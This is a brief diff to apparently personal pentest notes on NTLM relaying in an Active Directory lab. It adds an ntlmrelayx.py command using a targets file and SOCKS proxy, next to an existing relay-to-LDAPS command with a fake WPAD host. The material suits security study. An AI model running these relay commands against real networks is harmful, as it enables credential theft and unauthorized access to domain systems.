@@ -140,6 +140,8 @@ pip3 install .
 
 └─# ntlmrelayx.py -6 -t ldaps://192.168.0.30 -wh fakewpad.marvel.local -l lootme
 
+** ntlmrelayx.py -tf targets.txt -socks -smb2support
+
 cd lootme - files
     
 https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
